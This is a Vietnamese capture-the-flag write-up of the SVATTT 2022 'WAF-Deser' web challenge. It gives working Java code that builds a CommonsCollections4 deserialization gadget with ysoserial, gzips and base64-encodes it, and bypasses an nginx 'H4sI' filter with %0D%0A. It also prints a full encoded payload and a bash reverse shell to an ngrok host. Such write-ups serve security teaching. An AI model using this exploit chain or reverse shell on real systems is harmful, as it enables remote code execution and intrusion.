# ***1. Introduction***

- ***Description***: đây là một bài thi trong mảng WEB của vòng sơ khảo SVATTT 2022, một trong những challenge khá khó của cuộc thi, và chỉ có 7 đội giải được 😵‍💫
    
    ![image.png](https://images.viblo.asia/d93e1a96-1e63-4ca6-ae6f-d36cabee9a53.png)
    
- Source code: [https://drive.google.com/file/d/1GNwQzvSSLIYJleHQlFV7BIDN38EFymPQ/view?usp=sharing](https://drive.google.com/file/d/1GNwQzvSSLIYJleHQlFV7BIDN38EFymPQ/view?usp=sharing)

- Blog clb MSEC: https://vnmsec.blogspot.com/

# ***2. Reconnaissance***

## **Review application**

- Truy cập vào thì tôi được giao diện như sau
    
    ![image.png](https://images.viblo.asia/fdf35950-e880-47fe-a287-05e14caa087e.png)
    
    ![image.png](https://images.viblo.asia/2be4e3ae-e87c-439d-aaf6-b2d618c2b5fc.png)
    

⇒ Nothing

## **Review source code**

- Source code chỉ gồm 6 file như sau:
    
    ![image.png](https://images.viblo.asia/fbf037da-2bb0-4ab2-b934-05a14107b293.png)
    

### ***Config***

- Dockerfile
    
    ![image.png](https://images.viblo.asia/24a5d9c7-ec96-4744-af44-ca3dc626ebea.png)
    
    → Chú ý **FROM openjdk:11-slim**
    
- docker-compose.yml
    
    ![image.png](https://images.viblo.asia/81ed34da-6785-4e3d-8135-7a11136787a9.png)
    
- nginx.conf
    
    ![image.png](https://images.viblo.asia/f5a32999-f097-4045-b8a7-be6f0b4b315e.png)
    
**→ WAF được cấu hình để chỉ chấp nhận:** 
- Các URI nhỏ hơn **3000** byte
- Và trong URI không được có chuỗi **H4sI**
    

### ***App***

- Sử dụng **jd-gui** để đọc file **waf-deser-0.0.1-SNAPSHOT.jar**
    
    ![image.png](https://images.viblo.asia/61a587be-64df-46ca-a604-0cc918f30e49.png)
    
- Bắt đầu xem từ **pom.xml**, điểm đáng chú ý ở đây là **commons-collections4**, với tiêu đề challenge là **WAF-Deser** nên đây rất có thể bài này sẽ khai thác lỗ hổng Deserialization trên commons-collections4.
    
    ![image.png](https://images.viblo.asia/c9004e1e-6419-4435-ac2f-625ec0a46fc4.png)
    
- Các bạn có thể thao khảo lỗ hổng Deserialization tại [The Art of Deserialization Gadget Hunting - VNPT Cyber Immunity](https://sec.vnpt.vn/2020/02/co-gi-ben-trong-cac-gadgetchain/). Tôi nghĩ các bạn nên đọc hết tất cả các bài về Java Deserialization của anh **[Nguyễn Tiến Giang (Jang)](https://sec.vnpt.vn/author/jang/)**, một người viết về exploit Java rất hay và chi tiết.

- Tiếp theo đến **UserController.class**
    
    ![image.png](https://images.viblo.asia/19f1d1bc-cdb6-4769-aa98-5590fa983d30.png)
    
- Đầu tiên sẽ **unEndoe()** URI {info} và decode base64 lưu vào biến data. Hàm **unEndoe()** sẽ chỉ dùng để replace các ký tự đặc biệt
- Nếu **compress=true** thì thực hiện các hàm trong **if()** về cơ bản thì sẽ là:
    - chuyển biến data thành **ByteArray**
    - giải nén bằng **GZIPInputStream**
    - sau đó chuyển dữ liệu đã giải nén thành **ObjectInputStream** gọi hàm **readObject()** để Deser thành Object và ép kiểu thành **User**
- Điểm mấu chốt để **bypass WAF** của bài toán này là ở `Base64.getMimeDecoder().decode(unencodedData)` và `new GZIPInputStream(is)`
- Nhưng nginx đã được cấu hình để chặn các URI có **H4sI** mà chuỗi **H4sI** lại mà các byte magic của **GZIP** sau khi base64 encode 🤕🤕. Vậy thì bypass kiểu gì???

# ***3. Idea Exploit & Bypass WAF***

- Idea của tôi là:
- Tạo payload khai thác Deserialization cho **commons-collections4**
    - Sử dụng với công cụ [**ysoserial**](https://github.com/frohoff/ysoserial) (trong bài biết này tôi sử dụng [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified), về điểm cải tiến của ysoserial-modified các bạn có thể đọc thêm, ****ysoserial-modified**** là công cụ tôi biết được từ ****ippsec**** trong quá trình theo dõi anh ấy làm box [**UHC - LogForge - YouTube**](https://www.youtube.com/watch?v=XG14EstTgQ4))
- Tiếp đó đưa nó về kiểu **GZIPOutputStream** để bypass qua giới hạn **3000 byte** của URI, nếu sử dụng payload thông thường thì sẽ vượt quá **3000 byte** và bị WAF chặn vì vậy tôi phải dùng **GZIPOutputStream** để nén dữ liệu lại.
- Sử dụng **%0D%0A** để bypass **H4sI**, vì URI đến sẽ được decode base64, và base64 sẽ tự động remove **%0D%0A** khi decode. Lúc đầu tôi sử dụng Unicode để bypass nhưng không được @@@
- Và cần phải chú ý đến đoạn `s.replaceAll("-", "\\r\\n")` trong hàm **unEncode()**

# ***4. Payload***

### **Gen data GZIPOutputStream and Bypass WAF**

- Payload tôi đưa ra là:
    
    ```java
    package main;
    
    import java.io.*;
    import java.util.Base64;
    import java.util.zip.GZIPOutputStream;
    
    public class exp {
        public static void main(String args[]) throws Exception {
    
            Object pl = new String("MSEC_ADC");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            GZIPOutputStream gzipOut = new GZIPOutputStream(baos);
            ObjectOutputStream objectOut = new ObjectOutputStream(gzipOut);
            objectOut.writeObject(pl);
            objectOut.close();
    
            byte[] dat = baos.toByteArray(); //Files.readAllBytes(f.toPath());
            String x = Base64.getMimeEncoder().encodeToString(dat);
            System.out.println(x);
            System.out.println("\n");
    
            x = x.replaceAll("\\r\\n","");
            x = x.replaceAll("=","%3D");
            x = x.replaceAll("\\+","%2B");
            x = x.replaceAll("/","_");
    
            System.out.println(x);
            System.out.println("\n");
            System.out.println(x.length());
    
        }
    }
    ```
    
- Chạy file trên tôi đươc payload là: `H4sIAAAAAAAAAFvzloG1hIHDN9jVOd7RxRkAt38l%2BA8AAAA%3D`
    
    ![image.png](https://images.viblo.asia/945d3a5c-cac1-41d7-a2cb-1ef972d111b3.png)
    
- http://34.143.130.87:4999/info/H4%0d%0asIAAAAAAAAAFvzloG1hIHDN9jVOd7RxRkAt38l%2BA8AAAA%3D?compress=true
    
    ![image.png](https://images.viblo.asia/b9903d4c-082e-437e-bec0-7e59d298c5c2.png)
    
    → Xem lại trong source thì là  payload đã pass qua WAF và vào trong lệnh **if()** của source code vì ép kiểu sang User sai nên sẽ đi vào **Exception** và return ra `?????`
    

### **Sử dụng ysoserial và kiểm tra RCE trên local**

- Import **ysoserial-modified** vào intelij và sử dụng **CommonsCollections4().** Link hướng dẫn: [How to Add External JAR File to an IntelliJ IDEA Project? - GeeksforGeeks](https://www.geeksforgeeks.org/how-to-add-external-jar-file-to-an-intellij-idea-project/)

- Ban đầu cách làm của tôi là lưu payload vào file .bin sau đó xử lý qua FileInputStream, cách làm đó sẽ dài dòng hơn. Khi về nhà tôi đã thảo luận với một người anh về khó khăn trong việc xử lý qua FileInputStream và tôi đã nhận được một hint để có thể GZIP trực tiếp data bằng cách import file **ysoserial-modified.jar** và sử dụng các class của payload. ***Cảm ơn anh rất nhiều ạ!*** 🥳🥳🥳

💡 Chú ý: sẽ phải sử dụng **jdk11** để gen payload


- Khi chạy file docker-compose tôi kiểm tra server không có các lệnh như: curl, wget, ping, touch,… vì vậy tôi phải dùng echo để kiểm tra RCE trên local sau đó sẽ dùng bash dể reverse shell từ server
    
    ```java
    package main;
    import ysoserial.payloads.*;
    import ysoserial.payloads.util.CmdExecuteHelper;
    
    import java.io.*;
    import java.util.Base64;
    import java.util.zip.GZIPOutputStream;
    
    public class exp {
        public static void main(String args[]) throws Exception {
    
    //        Object pl = new String("MSEC_ADC");
            CmdExecuteHelper cmd = new CmdExecuteHelper("bash", "echo 123 > /tmp/MSEC_ADC.txt");
            Object pl = new CommonsCollections4().getObject(cmd);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            GZIPOutputStream gzipOut = new GZIPOutputStream(baos);
            ObjectOutputStream objectOut = new ObjectOutputStream(gzipOut);
            objectOut.writeObject(pl);
            objectOut.close();
    
            byte[] dat = baos.toByteArray(); //Files.readAllBytes(f.toPath());
            String x = Base64.getMimeEncoder().encodeToString(dat);
            System.out.println(x);
            System.out.println("\n");
    
            x = x.replaceAll("\\r\\n","");
            x = x.replaceAll("=","%3D");
            x = x.replaceAll("\\+","%2B");
            x = x.replaceAll("/","_");
    
            System.out.println(x);
            System.out.println("\n");
            System.out.println(x.length());
    
        }
    }
    ```
    
- Payload sẽ là:
    
    ![image.png](https://images.viblo.asia/1674c245-98e3-44ef-a374-de6df47110cc.png)
    
    ```
    H4%0d%0asIAAAAAAAAAK1WW2wUVRj%2Bz2730m0LdHvjVltEtAWZ2dKWtmyhbFvA1a1Ut3JxHzazs4ft4OzMMnOmbHnQYAw%2B8AIRQ3jSB9QHqkkTo8REE59MvMUHExOMCfHBJxUTSNQQL_%2BZme4utNItssnOmfnP_3_nO__tnLlfwGca0HZcmpEEiymqMGkouqGw2WcsatEL1yLv3x55ed4LnjjUmMopmoCQrOcLkiEx3WDQmuCWIrcUx0ryaLEAAB4EHtWNnCAVJHmaCmiX1zUTR1WlMlPwvU8og5nClCFp5jHdyCtargwm_vnKb9vmg196wJOA2iyVdRTT7Al4EUgC6tiCEUU62xO4nuisJ7rriZXriVNldWSJDPeuhKHLKqPSMr_bty5tuarND3gAbMDocoDHLE120KYlRaPZCkqRzy7%2B3HXqYo0HSAoalIoZk4GQWuHuLMO1uSedSpuh07tuB6%2BNvGXvxQ3hcPX7wU8maawC8cjMucaYZ_6Ch8eqVlnQYBB2EkeVtJx4MHMcwZDwjAEDuIRgWppQsWpRQjVB0Rg1NEkViqbKZAHjXkTusSP7FRUnoPyzozBSNeu4Q0nBpKog3nf21kuXz3wTxaxLgU%2BJGTmMQFNqMesU1CmTmAn5qdkCRZ1wpc6YKpmmEwnXVuBywbU99_WRN9aY3eqCuwkS37UyB9B8QUXmZhzH2sMHP9XmrvR6wR%2BHhrSiZanGnrbyGWrEYVXarhSVsjjKiykIpTOzDKspy1l7U6nRFPjTMifMS6s5Ab60JuXpnaFKMgOLM5qAxrRusYLFJg29gJWncJDKZlCWO80A_sEfuoEv9NRf61pyue8HSlmGck9qdO5m2x_%2B4NR1V%2By_8fnfH32C070wEgIvPByA3QHYEoBHCawxqaFI6iGsC4zmc_FxAuRJAg0L%2BXVIUi3qe7fztZvnf7ixh4B_WNEUhi_eru5DBGrGcNcEView_Bz_TPGaJrhVXUZYCcHx2xXWsGnFJNCUZFZmyvXhpDSr6lKWQH1c06hhx5miUn9i1tQdcmLB0TEdhxyQsjnKzEeWQIkSqC21MQJGVwJzQMQcECvq3c4BcSEHRDsHxPGDE9HUktp5tazr8MHmbYhJ91XiVfCEpGVVrHrukmBWl6085gvBJrqS5dF02sHB7Y_%2BfzIEQvuKMi3YZRqAxwi8vTJ_LMsgy_Li%2BNRErKiYcRTZB9aD8aHiwvE8uB8WBAKuLwnEHoQnk7plyBQ7JKZxvZuBAi_SeghBXQC6CPTeR8IS2FttRAwLW2ueirGMiSkuswUkAs12s1D0Mnm72oaqRV5AKmULgY5l9oIhGpZVtxU0lrvasw7JAGxFn6Gi%2B02gpas7sUgtWg%2BPw_YQbAMBO9HdvTEAESxnMaNoYkYyp4Owg4BnuxyEPgIbqTytd_bs6O3c0ymyfEGcSO4bS8fGxwRWZEHYib2GFqlMoKsrtbjpVlLB9ipTPFrqYRCGOJVd2P2STJJfmJAKbt9qL3tj8iQ2qb7I4M7%2ByECkZ7BnIIIkOxL3VIjCJvBg30VS%2BF8PPvDjGOD9GoK2DFMIn_UoEXEkOPq2fghk3lZpwKffFkZgFT7rHQVYDXv4SQdN0Ixa3HgE_14uu9uw3zbsdCZdQ_7WAq32PIE2WIsW6_Dd4chhN7iwcVu6BOyQDbvVmVwSdiO0owV_ewg6cPnyAkHoLm26H_G4Vuc74CWJqyD6P4aeo95wb_JoTbg_edQXHkh%2BANHD8zbSsL1Lgjdp3BEntAkacQzhlAc2wxqotfi524G635YOvg384GsJQFsA1gZgXbUH34mflF%2BH8wfWPpiDz7tf1xcddFuWPejQqpoWtJ7A5iqg7qg05_r0ny1kuTZwz8Qm1Sf27rsSO2zPN9nP5orotvLoFhjUYJUZhZMEinjhCVfeB5174pXW79774qvnL5Wug3gfbudKRQEbv1C6IpRvfXfcek_yhPbiFbKxDBzHnpmjRvjHNy__fvrVQbyGx8E3w5OkaDgedfScZDgz93p73YXrZ0sEeEZ2F_8FEGCygCUOAAA%3D
    ```
    
- Kết quả:
    
    ![image.png](https://images.viblo.asia/0b04b5eb-99e5-43b7-bdd7-1f6a0448143f.png)
    
    ![image.png](https://images.viblo.asia/4791d05e-4c1d-4f41-a2eb-b87f5f574eef.png)
    
    ![image.png](https://images.viblo.asia/88fe005b-3b14-4941-a4ad-24c7273cde2d.png)
    

⇒ Như vậy tôi đã RCE thành công. Ở đây mặc dù return ????? nhưng vẫn RCE được là do hàm readObject() sẽ được thực thi xong thì mới tiến hành ép kiểu sang User mà do đó tôi sẽ RCE được trước khi bị Exception nên response luôn là `Hello ?????`

# ***5. Get Flag***

- Setup:
    
    ![image.png](https://images.viblo.asia/3923e132-71a2-45a5-b0a2-d13d67e8ad0c.png)
    
    ![image.png](https://images.viblo.asia/01ac1fd5-cb28-41ab-9d6f-b70e2a19fd7d.png)
    
- Payload revershell:
    
    ```java
    package main;
    import ysoserial.payloads.*;
    import ysoserial.payloads.util.CmdExecuteHelper;
    
    import java.io.*;
    import java.util.Base64;
    import java.util.zip.GZIPOutputStream;
    
    public class exp {
        public static void main(String args[]) throws Exception {
    
    //        Object pl = new String("MSEC_ADC");
            CmdExecuteHelper cmd = new CmdExecuteHelper("bash", "bash -c 'bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/17129 0>&1'");
            Object pl = new CommonsCollections4().getObject(cmd);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            GZIPOutputStream gzipOut = new GZIPOutputStream(baos);
            ObjectOutputStream objectOut = new ObjectOutputStream(gzipOut);
            objectOut.writeObject(pl);
            objectOut.close();
    
            byte[] dat = baos.toByteArray(); //Files.readAllBytes(f.toPath());
            String x = Base64.getMimeEncoder().encodeToString(dat);
            System.out.println(x);
            System.out.println("\n");
    
            x = x.replaceAll("\\r\\n","");
            x = x.replaceAll("=","%3D");
            x = x.replaceAll("\\+","%2B");
            x = x.replaceAll("/","_");
    
            System.out.println(x);
            System.out.println("\n");
            System.out.println(x.length());
    
        }
    }
    ```
    
    ![image.png](https://images.viblo.asia/8e288d91-16fd-48c7-8f30-38bc4b740c67.png)
    
- Flaggggggggggggggggggg
    
    ![image.png](https://images.viblo.asia/0ca449f1-fbd3-41d9-9db5-190cebc03d46.png)
    
    ![image.png](https://images.viblo.asia/3bd8fdfb-d76b-4d4b-8a57-4366f223ec6b.png)
    

⇒ Flag là: `ASCIS{0H_Mime_B@s364!T1me_2_le4rN_Seri0U5ly!!!!}`

# ***6. Conclusion***

- Đây là một challenge ****Deserialization Java**** khá hay ho, rất tiếc là tôi đã không thể hoàn thành nó trong thời gian cuộc thi do không đủ thời gian. Vì quá bấn loạn ở challenge thứ nhất (bài về SQL Injection), tôi đã mất cả buổi sáng cho nó rồi đến trưa nhận ra là mình quét nhầm METHOD 🤒
- Và cũng là những lần rất ít tôi đi code Java, việc quản lý các Input/OutputStream ban đầu với tôi là rất khó khăn 🥸

# ***7. Reference***
- https://sec.vnpt.vn/2020/02/co-gi-ben-trong-cac-gadgetchain/ 

- https://www.geeksforgeeks.org/gzipoutputstream-class-in-java/

- https://www.youtube.com/watch?v=XG14EstTgQ4